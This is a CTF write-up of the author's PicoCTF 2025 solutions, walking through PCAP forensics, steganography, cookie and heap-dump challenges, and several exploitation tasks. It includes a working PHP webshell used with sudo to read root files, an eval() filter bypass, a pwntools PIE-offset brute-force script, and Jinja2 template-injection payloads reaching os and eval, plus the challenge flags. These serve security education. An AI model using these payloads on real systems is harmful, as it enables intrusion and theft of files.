## **Introduction**
Welcome to my walkthrough of some of the PicoCTF 2025 challenges I completed during this years competition (my first)! PicoCTF is a Capture The Flag (CTF) competition designed to teach cybersecurity skills through hands-on problem-solving. This post chronicles my journey through various challenges spanning forensics, web exploitation, cryptography, reverse engineering, and binary exploitation, completed between March 7 and March 13, 2025. Each section breaks down the problem, my approach, and the final flags, offering insights into tools like Wireshark, Python, and steganography techniques. 

**Placement:**

- 1610 Points

- 1618/10475 - Top 15% (total)

- 1618/6510 - Top 25% (active competitors)

## General Notes

- **PCAP (Packet Capture) File**: A snapshot of network traffic, like a recording of data packets between devices. You can utilize tools like Wireshark, tcpdump, tshark, and more to analyze these packets and find important data.
- **Heap Snapshot**: A point-in-time capture of a program's memory, specifically the heap (where dynamically allocated data like objects, arrays, and strings live during runtime). The heap is managed by the program or its runtime environment (e.g., JVM). The snapshot process briefly pauses the runtime and serializes the heap into a file with all live objects.
- **sudo -l**: A Linux command that lists the sudo privileges of the current user.
- **Steganography**: The practice of hiding information in another message or object.
- **Unsanitized Input**: Refers to raw data or user input that hasn’t been cleaned, filtered, or validated to remove potentially harmful or malicious content. For example, if a website accepts unsanitized input in a form field, an attacker could inject code (like SQL or JavaScript) to mess with the system—think stealing data or crashing it.
- **Server Side Template Injection**: A vulnerability where an attacker can inject malicious code into a template processed on the server side. Templates dynamically generate HTML by combining fixed layouts with user input or data. If input isn’t properly sanitized and gets fed into the template engine, arbitrary code can be injected. Template engines (e.g., Jinja2, Twig, ERB) have their own syntax for variables, loops, etc.

## FANTASY CTF - 03/07/2025 | ~3 mins
Fun terminal game to get an introduction to the competition and the password.

## Ph4nt0m 1ntrud3r (Forensics) - 03/07/25 | ~1.25hrs
The task for this Forensics challenge was to analyze a PCAP file containing network traffic to uncover how a "digital ghost" infiltrated the system and stole sensitive data. The key hint to this challenge is "Timing", suggesting that order or delta between packets sent etc. would be the key.

### Step 1: Understanding PCAP & The Data
A PCAP file captures network packets, including timestamps, protocols, and payloads. Since the challenge involved a breach and a hidden flag, I assumed the flag was embedded in the traffic, possibly in packet data or metadata.

I started by inspecting the PCAP with Wireshark and tshark to get a sense for the data and look for any patterns. I noticed the length of the packets and the ASCII characters at the end of each packet could lead to a potential Base64 string but the numbers weren't quite adding up and I didn't know exactly how to go about extracting the correct characters.

Extract basic info:
```sh
tshark -r ~/picoCTF2025/myNetworkTraffic.pcap -T fields -e frame.number -e frame.time_relative > timings.txt
```

*Output:* This gave us 22 packets with frame numbers and relative timestamps (time since the first packet).
- Negative frame.time_relative values were odd—normally, these should start at 0 and increase. This suggested either a corrupted PCAP or intentional manipulation, tying into the "timing" hint. 

### Step 2: Timing Analysis
The hint regarding timing and varying timestamps suggested a timing-based covert channel. In such schemes, time gaps (deltas) between packets encode data—e.g., short gaps for 0, long gaps for 1. Maybe the flag was hidden this way.

I calculated deltas between consecutive packets using Python:
```py
with open("timings.txt", "r") as f:
    lines = [line.strip().split() for line in f if line.strip()]
    times = [float(line[1]) for line in lines]

deltas = [abs(times[i] - times[i-1]) for i in range(1, len(times))]
print("Packet Deltas (seconds):", deltas)

binary = [0 if delta < 0.001 else 1 for delta in deltas]
print("Binary Sequence:", binary)
```

I tried converting this 21-bit sequence into ASCII by grouping into 8-bit chunks, but the result `&ph` clearly wasn't the flag. 

### Step 3: Payload Inspection 
Since timing alone didn’t give the flag, I checked the packet payloads.

Extracting the payloads:
```sh
tshark -r ~/picoCTF2025/myNetworkTraffic.pcap -T fields -e frame.number -e tcp.payload
```

I decoded the snippets given in base64 and got some interesting leads like `picoCTF`  and `nt_th4t` but many failed or didn't string a full actual flag together. 

### Step 4: Sorting by Absolute Time
The negative frame.time_relative values suggested the PCAP’s packet order was scrambled. I needed the true chronological order using absolute timestamps (frame.time_epoch), then decode payloads in that sequence.

Extracting timestamps and payloads:
```sh
tshark -r ~/picoCTF2025/myNetworkTraffic.pcap -T fields -e frame.time_epoch -e tcp.payload > packets.txt
```

Sorted by epoch time:
```sh
sort -k1 -n packets.txt > sorted_packets.txt
```

I then decoded each base64 individually where many yielded binary but some gave ASCII characters. 

### Step 5: Piecing the Flag
We needed all payloads in timestamp order, decoded, and concatenated, ignoring undecodable noise.

Python script to automate this process:

```py
import base64

payloads = [
    "ePRXDio=", "dgV9v0s=", "nfu4Vww=", "XThGxuE=", "CJr4oDk=", "TOGSGg4=",
    "ckBkZLk=", "YQEFzIU=", "3psv5C4=", "a23/UbI=", "BgJLB0c=", "Yt8ksMM=",
    "fjIzQwk=", "bpzQ0R8=", "J4auZMY=", "cGljb0NURg==", "ezF0X3c0cw==",
    "bnRfdGg0dA==", "XzM0c3lfdA==", "YmhfNHJfOQ==", "NTlmNTBkMw==", "fQ=="
]

flag = ""
for hex_payload in payloads:
    base64_str = hex_payload
    try:
        decoded = base64.b64decode(base64_str).decode('utf-8')
        flag += decoded
    except:
        # Skip if decoding fails (non-text payload)
        continue

print("Flag:", flag)
```

Filtering printable text from the sorted sequence gave the correct flag.

**Flag:**

`picoCTF{1t_w4snt_th4t_34sy_tbh_4r_959f50d3}`

## Cookie Monster Secret Recipe (Web Exploitation) - 03/08/25 | <3 mins
After reading the description and challenge name it was pretty obvious that it was going to be a challenge involving cookies.

### Solution:
1. After entering the website inspect element and go to the cookies section
2. Enter some random information and submit it to the form
3. A cookie will then pop up which is also a Base64 string,
4. Decode the string and submit the flag

**Flag:**

`picoCTF{c00k1e_m0nster_l0ves_c00kies_DE7A5E76}`


## head-dump (Web Exploitation) - 03/08/25 | ~10 mins
After reading the description and looking around the website you get a pretty good idea that the flag is going to have something to do with the API docs blog.

### Solution:
1. You will notice the `/heapdump` section and a domain we can visit
2. Visit the domain and it will download a *heapsnapshot* file (I talked more about above)
3. You can then simply `cat` the file and search for the flag alternatively run the following grep command and get the flag: 

```
 grep "picoCTF{" heapdump-1741448399227.heapsnapshot
```

**Flag:**

`picoCTF{Pat!3nt_15_Th3_K3y_305d5b9a}`

## hashcrack (Cryptography) - 03/08/25 | <10 mins
Just a simple cryptography cracking problem.

### Solution:
1. Run the given netcat shell command
```sh
nc verbal-sleep.picoctf.net 57356
```
2. Use hashid to determine the type of encryption used
```sh
hashid <hash>
```
3. You can use any number of rainbow tables or solvers to decrypt the hash (could have even skipped the last step)
4. You will have to do so constantly until you are given the flag

**Flag:**

`picoCTF{UseStr0nG_h@shEs_&PaSswDs!_dcd6135e}`

## RED (Forensics) - 03/08/25 | ~30 mins
### Step 1: Exploring the Image
The first thing I thought to do was things like check the metadata with `cat` the file.

```sh
cat red.png
```

The file type was correct but there was an interesting poem. The first letter of every line from the poem spelt: *CHECKLSB*. After some research it led me to Least Significant Bit (LSB) steganography. This is a technique where data is hidden in the lowest bitx of pixel values.

The image was also in a PNG (128x128) format which is perfect for LSB due to its lossless compression.

### Step 2: Manual Pixel Analysis
I ran some python code on the RGB channels but nothing was readable or useful really. After hitting this wall and being stuck here for a while with no progress I was a little confused but made a breakthrough soon after.

### Step 3: Utilizing zsteg
In researching for solutions I found the tool `zsteg` which is built for PNG LSB steganography. It extracts and analyzes the bit planes of an images color channels trying different combinations and orders to reveal embedded data. 

```sh
zsteg red.png
```

After installing and running `zsteg` on `red.png` I noticed what seemed to be a Base64 string. I entered the Base64 into a decoded and got the flag.

The flag was embedded in the LSB (bit 0) across all four channels. (Red, Green, Blue, Alpha) *Alpha is the transparency.*

**Flag:**

`picoCTF{r3d_1s_th3_ult1m4t3_cur3_f0r_54dn355}`

## n0s4n1ty 1 (Web Exploitation) - 03/08/25 | ~20 mins
The challenge provided a web page with a file upload form titled "No Sanity" *(hinting at no sanitization)* that allowed users to upload a profile picture, preview it client-side, and submit it to upload.php. 

### Step 1: Analyze the Code
The challenge included HTML and JavaScript code for a file upload form, hinting that the vulnerability lay in how files were handled. The title "No Sanity" suggested a lack of sanitization, which allows for arbitrary file uploads.

### Step 2: Testing File Upload with a Webshell
Unsanitized file uploads often allow PHP files to be uploaded and executed. A webshell would give us command execution.

**Created shell.php**
```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
} else {
    echo "No command provided.";
}
?>
```

The `shell.php` file was uploaded correctly as thought.

### Step 3: Accessing the Webshell
If shell.php is in a web-accessible directory, we could trigger it and run commands by passing them via the cmd parameter.

**Tested the hypothesis:**
```sh
curl "http://standard-pizzas.picoctf.net:50894/uploads/shell.php?cmd=whoami"
```

### Step 4: Accessing root Permissions
If the flag was in a root-only location like we were told, we needed to escalate privileges. sudo -l would reveal if www-data could run commands as root.

**Ran:**
```sh
curl "http://standard-pizzas.picoctf.net:50894/uploads/shell.php?cmd=sudo%20-l"
```

Output confirmed that we could run any command as root without a password.

### Step 5: Searching for the Flag
With root access, we could read any file.

**Listed Root Directory:**
```sh
curl "http://standard-pizzas.picoctf.net:50894/uploads/shell.php?cmd=sudo%20/bin/ls%20/root"
```

*Output: flag.txt*

**Read the flag:**
```sh
curl "http://standard-pizzas.picoctf.net:50894/uploads/shell.php?cmd=sudo%20cat%20/root/flag.txt"
```

**Flag:**

`picoCTF{wh47_c4n_u_d0_wPHP_8ca28f94}`

## Flag Hunters (Reverse Engineering) - 03/09/25 | ~20 min
The script’s default call is reader(song_flag_hunters, '[VERSE1]'), starting at [VERSE1]. The description mentions a “hidden refrain” not printed by default, implying we need to redirect execution to an unvisited section, likely the secret_intro with the flag.

1. `secret_intro` with the flag (Lines 1-4)
2. `reader` starts at `[VERSE1]` it skips the hidden refrain
3. The input is unsanitized so we can manipulate the input to give us the flag
4. `RETURN [number]` jumps to any line number offering control of the starting point 
5. If we input `RETURN 1` it fails due to the *Crowd:* prefix
6. We can use `;` to seperate commands which will allow `RETURN 1` to execute in the input and in theory return the flag

**Flag:**

`picoCTF{70637h3r_f0r3v3r_a3d964ee}`

## Event-Viewing (Forensics) - 03/10/25 | ~30 min
Somewhere in these Windows Event Logs is the flag.

1. The first thing I did after `cat <file>` was a quick search for CTF keywords but nothing came up
2. After thinking about the process more deeply I thought about what sort of keywords would come up for each event
   1. I search words like `INSTALL` and notcied some Base64 encoded characters in the area I decoded for Part 1 of the flag
3. Next I searched for other events interacting with the installed software `Totally_Legit_Software` and I came across the second part of the Base64 encoded flag
4. The last part took quite a bit longer as the Base64 was less obvious and there was no obvious keyword to search up
   1. After searching for `shutdown` I find the final part of the Base64 encoded flag

**Flag:**

`picoCTF{Ev3nt_vi3wv3r_1s_a_pr3tty_us3ful_t00l_81ba3fe9}`

## 3v@l (Web Exploitation) - 03/10/25 | ~15 min
We’re dealing with a Flask-based "Bank-Loan Calculator" that uses eval() to execute user input from a textarea. The backend has security measures like blacklisted words and regex. We need to find the flag in the `/flag.txt` file.

### Step 1: Understanding eval()
`eval()` executes any valid Python expression and returns the result. It's meant for arithmetic but it's unrestricted enough to run most code.

### Step 2: Testing Inputs
Tested inputs like `len('abc)` and others to see what type of responses we were getting to better understand what type of python code we were working with and how to bypass it. 

Most inputs retured `None` or Denied Access but we were starting to realize that what we needed for out successful payload. We needed a payload that could execute, return a value, and avoid blacklists and regex.

### Step 3: Crafting the Payload
After some research I had the idea to utilize `__builtins__` which provides access to Python's built-in functions without importing modules and was finding some success.

With the help of one of the hints we had the idea to encoded `/flag.txt` because the Regex may interfere. We  had a few different potenial approaches to do so:
1. Encode with it with Base64 and decoded after in the same input
2. Utilizing `chr()`, a powerful buit-in Python function that converts an integer to an ASCII value

### Step 4: Retrieving the Flag
After some testing and research we were able to create our working input to return the flag

**Append a marker to force output:**
```sh
__builtins__.open(chr(47) + chr(102) + chr(108) + chr(97) + chr(103) + chr(46) + chr(116) + chr(120) + chr(116), 'r').read() + 'FLAG_FOUND'
```

**Flag:**

`picoCTF{D0nt_Use_Unsecure_f@nctions6798a2d8}`

## PIE TIME (Binary Exploitation) - 03/11/25 | ~25 min
The challenge involves a remote binary running on a server, where we connect via Netcat. The binary uses `Position Independent Executable (PIE)` protection, meaning its memory addresses randomize each run. We’re given the source code (`vuln.c`) and binary (`vuln`), and our task is to manipulate the program to call a win() function that prints the flag from `flag.txt`.

## Step 1: Understand the Source Code
There is a vulnerability where `scanf("%lx", &val)` reads a hexadecimal address from us and `void (*foo)(void) = (void (*)())val; foo();` casts our input to a function pointer and calls it. This is an arbitrary function call vulnerability, we can jump to any address in memory. We need to call `win()` which opens flag.txt and prints the contents. PIE is enabled so main and win's addresses change each run. 

`printf("Address of main: %p\n", &main)` leaks main’s runtime address, giving us a reference point despite PIE.

If we jump to an invalid address, `segfault_handler()` catches the SIGSEGV, prints a message, and exits cleanly.

## Step 2: Crafting the Python Expoloit
This script automates the exploitation of the vuln binary running on the server. It connects to the server and grabs the leak and extracts the address if `main()` that is printed. It tests various offsets nandadds a range to `main's` addresses trying to find `win`. It send the guess and checks to see if `You won!` and then retrieves the flag.

```py
from pwn import *

def try_offset(offset):
    p = remote('rescued-float.picoctf.net', 61785)
    p.recvuntil(b"Address of main: ")
    main_addr = int(p.recvline().strip(), 16)
    win_addr = main_addr + offset
    log.info(f"Main: {hex(main_addr)}, Trying win: {hex(win_addr)} (offset {hex(offset)})")
    p.sendline(hex(win_addr)[2:].encode())
    try:
        response = p.recvall(timeout=2)
        print(f"Offset {hex(offset)}: {response.decode(errors='ignore')}")
        if b"You won!" in response:
            return True, response.decode()
    except EOFError:
        print(f"Offset {hex(offset)}: Connection closed (segfault)")
    finally:
        p.close()
    return False, None

# Test around -0x90
offsets = range(-0xa0, -0x7f, 1)
for offset in offsets:
    success, result = try_offset(offset)
    if success:
        print(f"Flag found at offset {hex(offset)}!")
        print(result)
        break
```

**Flag:**

`picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_3d38fb4b}`

## SSTI1 (Web Exploitation) - 03/11/25 | ~20 min
This challenge involved exploiting a Server-Side Template Injection (SSTI) vulnerability in a web application, built with Jinja2. The goal was to execute arbitrary code and retrieve a flag from the server.

## Step 1: Identifying SSTI
```sh
{{ 7 * 7 }}
```

Worked and confirmed we were using Jinja2 template engine.

## Step 2: Enumerating Classes and Locating os
**Listing Python classes:**
```sh
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

**Inspected and Located os:**
```sh
{{ ''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__ }}
```

## Step 3: Exploitation Attempts
Tried executing attempts directly and got multiple Internal Server Errors or empty responses etc.

```sh
{{ ''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['os'].system('cat /flag.txt') }}

{{ ''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['os'].popen('cat /flag.txt').read() }}

{{ ''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['__builtins__']['exec']('import os; print(os.popen("ls").read())') }}
```

## Step 4: Pivot to eval()
After some testing we found that `eval()` wad returning values. SO I checked the OS and listed the root directory and found the challenge driectory.

**Testing eval():**
```sh
{{ ''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['__builtins__']['eval'](' "test" ') }}
```

**Exploring OS:**
```sh
{{ ''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['__builtins__']['eval']('__import__("os").name') }}
```

**List Root:**
```sh
{{ ''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['__builtins__']['eval']('__import__("os").listdir("/")') }}
```

## Step 7: Retrieve Flag
**List Challenge:**
```sh
{{ ''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['__builtins__']['eval']('__import__("os").listdir("/challenge")') }}
```

**Read Flag:**
```sh
{{ ''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['__builtins__']['eval']('open("/challenge/flag").read()') }}
```

**Flag:**
